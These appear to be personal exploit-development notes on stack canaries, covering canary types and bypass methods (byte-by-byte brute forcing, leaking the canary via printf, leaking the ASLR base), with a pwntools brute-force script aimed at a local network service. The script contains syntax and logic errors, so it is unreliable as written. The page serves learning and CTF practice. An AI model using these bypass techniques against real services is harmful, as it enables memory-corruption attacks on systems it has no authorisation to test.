# Canary Bypass

## Stack Canaries

Stack canaries are used to detect a stack buffer overflow before execution of any malicious code can occur. This method works by placing a **small integer**, which value has been randomly chosen at the start of the program within the stack **just before the stack return pointer**.&#x20;

We can illustrate how it works through analysing the stack contents:

<figure><img src="../.gitbook/assets/image (2493).png" alt=""><figcaption></figcaption></figure>

When the binary runs, it checks the canary and ensures that it does not change. If altered, the execution would end immediately.&#x20;

Stack canaries are checked for their value just before the return to the calling function, which is where attackers would normally gain control over the instruction pointer.&#x20;

### Types of Canaries

There are many types of canaries, but here are the most common ones:

|                   |                     |                          |
| ----------------- | ------------------- | ------------------------ |
| _Type_            | _Example_           | _Protection_             |
| Null canary       | 0x00000000          | 0x00                     |
| Terminator canary | 0x00000aff          | 0x00, 0x0a, 0xff         |
| Random canary     | \<any 4-byte value> | Usually starts with 0x00 |
| Random XOR canary |                     | Usually starts with 0x00 |
| 64-bit canary     | <8 bytes>           |                          |
| Custom canary     |                     |                          |

Each canary has their own set of advantages and security measures introduced:

* Null Canary is the most simple as it's just 4 NULL bytes. However, this is the most vulnerable of canaries because its predictable and **there are functions that can read null canaries**.
* Terminator Canaries introduces two or more hex values that attempt to terminate string operations. These values are still predictable
* Random Canaries are better in terms fo protection, and **usually consist of a NULL byte followed by 3 random bytes**. The NULL byte would attempt to terminate string operations, while the 3 random bytes will make the canary less predictable.
* The random XOR canary is similar to the random canary, but its value is XOR'd against a non-static value in the program, such as the EBP. Since most binaries run with ASLR enabled, this provides a lot more security.&#x20;

## Bypasses

### Brute Forcing

One of the ways is to brute force and randomly guess the canary. This only works **if the canary is a  static value and it has the same canary everytime** (common for network services). We can brute force a canary **char by char** and see if the program crashes or continues.

This is the python script I use to brute force canaries:

```python
from pwn import *

def connect():
    r = remote("localhost", 13337)
    
def get_cookie(base):
    canary = ''
    guess = 0x0
    base += canary
    
    while len(canary) < 8 # or 4 if 32-bit
        while guess != 0xff:
            r = connect()
            
            r.recvuntil("if needed")
            r.send(base + chr(guess))
            # add as many r.recvuntil as needed.
            
            if "OUTPUT IS PRODUCED" in r.clean():
                print("Guessed Correct bytes", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()
        print(canary)
        return base
    
offset = 123
base = "A" * offset
base_canary = get_cookie(base)
print (base_canary)
```

The rough script is like this using `pwntools`.&#x20;

### Printing Stack Values

Another way is to print out the values of the stack and view the canary. Most canaries begin with the NULL byte of \x00, and we can make use of certain functions, like `printf` that may be running within the binary to see the values of the stack.&#x20;

Alternatively, one could create a script that would intercept the value of the canary and then send the exploit later with this value. In some cases, this is the only way to exploit the binary due to a randomised value.&#x20;

### ASLR Bypass

As with all ASLR bypasses, the main thing to leak is the **base address value**. This can be done through the usage of an LFI exploit to read the processes that are running (like in HTB Retired), or calculation of the base through brute-forcing the instruction and base pointer values.&#x20;

Once the base is leaked, the **offsets** can be calculated to create a ROP chain if needed.
